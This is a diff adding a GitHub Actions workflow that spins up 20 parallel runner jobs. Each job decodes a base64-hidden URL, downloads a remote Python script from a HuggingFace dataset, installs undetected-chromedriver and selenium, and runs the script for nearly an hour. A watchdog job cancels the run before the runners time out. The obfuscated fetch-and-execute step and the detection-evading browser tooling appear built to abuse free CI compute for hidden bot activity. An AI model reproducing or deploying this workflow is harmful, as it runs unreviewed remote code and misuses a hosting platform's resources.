@@ -1,0 +1,108 @@
+name: Obsidian Horizon Grid Pipeline
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: horizon-grid-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # Watchdog: holds for 3540 seconds then aborts the current run
+  # =================================================================
+  horizon-watchdog:
+    name: "Horizon Watchdog"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      WATCHDOG_TIMER: 3540
+    steps:
+      - name: Start Watchdog Timer
+        run: |
+          echo "[WATCHDOG] Armed for run ID: ${{ github.run_id }}"
+          echo "[WATCHDOG] Waiting ${WATCHDOG_TIMER}s before sending abort signal."
+
+          sleep "${WATCHDOG_TIMER}"
+
+          echo "[WATCHDOG] Timer expired — sending run cancellation request."
+
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+
+          echo "[WATCHDOG] Cancellation request sent."
+
+  # =================================================================
+  # Grid Workers: parallel runner fleet
+  # =================================================================
+  grid-fleet:
+    name: "GridUnit-${{ matrix.unit_code }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        unit_code: [
+          "u7a1", "u8b2", "u9c3", "u4d4", "u5e5",
+          "u6f6", "u2g7", "u3h8", "u1j9", "u0k0",
+          "v1m2", "v2n3", "v3p4", "v4q5", "v5r6",
+          "v6s7", "v7t8", "v8w9", "v9x1", "v0z2"
+        ]
+
+    steps:
+      # -----------------------------------------------------------------
+      # Phase 1: System dependencies
+      # -----------------------------------------------------------------
+      - name: Prepare Environment
+        run: |
+          echo "[ENV] Setting up GridUnit-${{ matrix.unit_code }}..."
+          sudo apt-get update -qq
+          sudo apt-get install -y curl python3-pip
+
+      # -----------------------------------------------------------------
+      # Phase 2: Fetch worker script
+      # -----------------------------------------------------------------
+      - name: Fetch Worker Script
+        run: |
+          echo "[FETCH] Retrieving worker script..."
+          REMOTE_SOURCE=$(printf '%s' "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 -d)
+          curl -sL "$REMOTE_SOURCE" -o worker_engine.py
+          echo "[FETCH] Worker script ready."
+
+      # -----------------------------------------------------------------
+      # Phase 3: Python libraries
+      # -----------------------------------------------------------------
+      - name: Install Python Dependencies
+        run: |
+          echo "[DEPS] Installing required Python packages..."
+          pip3 install -q undetected-chromedriver selenium requests psutil
+
+      # -----------------------------------------------------------------
+      # Phase 4: Run worker with time limit
+      # -----------------------------------------------------------------
+      - name: Execute Worker Engine
+        run: |
+          echo ">> Starting engine on GridUnit-${{ matrix.unit_code }}..."
+
+          python3 worker_engine.py &
+          ENGINE_PID=$!
+
+          echo ">> Engine active. Time cap: 3540 seconds."
+
+          sleep 3540
+
+          if kill -0 "$ENGINE_PID" 2>/dev/null; then
+            echo ">> Time cap reached — stopping engine process."
+            kill -9 "$ENGINE_PID"
+            echo ">> Engine process stopped."
+          else
+            echo ">> Engine finished prior to time cap."
+          fi
